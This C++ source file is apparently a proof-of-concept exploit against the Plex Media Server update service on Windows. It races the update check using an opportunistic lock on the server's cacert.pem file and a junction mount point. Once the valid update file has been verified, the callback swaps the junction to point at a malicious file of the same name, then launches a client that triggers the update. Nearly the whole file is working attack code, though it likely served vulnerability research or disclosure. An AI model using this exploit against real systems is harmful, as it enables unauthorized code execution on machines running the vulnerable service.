//  Copyright 2015 Google Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

#include "stdafx.h"
#include <FileOpLock.h>
#include <ReparsePoint.h>
#include <windows.h>


static FileOpLock* oplock = nullptr;
static LPCWSTR junction = L"C:\\repo\\PlEXcalaison\\TOCTOU\\junction";  // Path to junction folder , MAKE SURE IT IS EMPTY !
static LPCWSTR target1 = L"C:\\repo\\PlEXcalaison\\TOCTOU\\valid"; // Path to folder contains the valid update file.
static LPCWSTR target2 = L"C:\\repo\\PlEXcalaison\\TOCTOU\\malicious"; // Path to folder contains the malicious file - MUST BE THE SAME NAME AS THE UPDATE FILE.
static LPCWSTR cacert = L"C:\\Program Files (x86)\\Plex\\Plex Media Server\\Resources\\cacert.pem"; // Path to cacert.pem - can be found in plex directory.

int i = 0;

void SwitchMountPoint()
{
	printf("Switching mount point to \n");
	ReparsePoint::DeleteMountPoint(junction);
	ReparsePoint::CreateMountPoint(junction, target2, L"");
}

int _tmain(int argc, _TCHAR* argv[])
{
	/*
	After the update service will close the valid update file he will open the cacert.pem.
	So inorder to win the race we will set oplock on cacert.pem file.
	As soon he will be accessed a callback function will swap the mountpoint of the junction folder and will point to the malicious file.
	*/ 
	oplock = FileOpLock::CreateLock(cacert, L"-x", SwitchMountPoint);
	if (ReparsePoint::CreateMountPoint(junction, target1, L""))
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!
			CreateProcess
			(
				// Path to the rpc client that trigger the update.
				TEXT("..\\Release\\PlexClient.exe"),
				NULL, NULL, NULL, FALSE,
				CREATE_NEW_CONSOLE,
				NULL, NULL,
				&si,
				&pi
			)
			)
		{
			printf("Unable to execute.");
		}
		
		if (oplock != nullptr)
		{
			oplock->WaitForLock(INFINITE);

			delete oplock;
		}
	}
	else
	{
		return 1;
	}
	
	return 0;
}

